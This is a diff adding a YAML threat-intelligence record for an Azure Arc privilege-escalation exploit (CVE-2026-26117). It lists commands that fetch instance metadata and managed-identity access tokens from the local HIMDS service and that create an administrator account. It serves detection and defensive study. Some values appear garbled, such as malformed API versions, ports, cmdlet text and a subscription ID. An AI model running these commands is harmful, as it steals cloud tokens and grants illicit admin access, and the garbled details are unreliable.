@@ -1,0 +1,55 @@
+description: Exploit targeting Azure Arc services to fetch metadata and access token,
+  create a user with administrative privileges
+TTPs:
+  processes:
+  - cmd.exe
+  - powershell.exe
+  commandline:
+  - net user weakUser name
+  - hostname
+  - iwr -Headers @{Metadata = "true"} -Uri http://127.0.0.1:40342/metadata/instance?api-version=2020-06-01
+  - net users
+  - net user pob /add
+  - net localgroup administrators pob /add
+  powershell:
+  - try {& $metadataResponse = Invoke-WebRequest -Uri http://127.0.0.1:4032/metadata/instance/compute?api-version=2013-11-01"
+    -Method GET -Headers5 | Snetadutadsan | Out-File -FilePath meta.json -Encoding
+    LTS10 3} catch {Write-host "error fetching metadata:" -ForegroundColor Red}
+  - Invoke-WebRequest -Uri http://127.0.0.1:40345/metadata/identity/token?resource=https://management.core.windows.net&api-version=2019-08-15
+  - Invoke-WebRequest -Uri http://127.0.0.1:4032/metadata/instance/compute?api-version=2013-11-01
+  - Write-Host *nRunComnand provisioningState:" $response.provisioningState
+  scripting_engine: []
+  registry_keys: []
+  image_load: []
+  network_connections:
+  - HIMDS service, port 40342
+  - HIMDS service, port 40341
+  - http://127.0.0.1:48342/metadata/instance?api-version=2619-83-11
+  - https://management.azure.com/subscriptions/GabT7ca2-2929-2f-B6Bc-7d88c3aacad0/resourceGroups/test_group/providers/Microsoft.HybridCompute/machines/adcs-server/extensions/CustomScriptExtension
+  file_activity:
+  - C:\Users\weak>net user weakUser name
+  - C:\Users\weak>hostname
+  - meta.json
+  - C:\\Users\\weak\\Downloads\\meta.json
+  - C:\\Users\\weak\\Documents\\accessTokens.txt
+  persistence: []
+  process_relations: []
+CVEs:
+- CVE-2026-26117
+IOCs:
+  hashes: []
+  ip_addresses:
+  - 127.0.0.1
+  domains:
+  - management.azure.com
+  urls:
+  - http://127.0.0.1:40342/metadata/instance?api-version=2020-06-01
+  - http://127.0.0.1:40345/metadata/identity/token?resource=https://management.core.windows.net&api-version=2019-08-15
+  - http://127.0.0.1:48342/metadata/instance?api-version=2619-83-11
+  - https://management.azure.com/subscriptions/GabT7ca2-2929-2f-B6Bc-7d88c3aacad0/resourceGroups/test_group/providers/Microsoft.HybridCompute/machines/adcs-server/extensions/CustomScriptExtension
+authors:
+- Ben Zamir
+- Ilan Kalendarov
+reference: https://cymulate.com/blog/cve-2026-26117-azure-arc-windows-lpe-cloud-identity-takeover
+date_of_publication: March 14, 2026
+file_creation_date: March 14, 2026
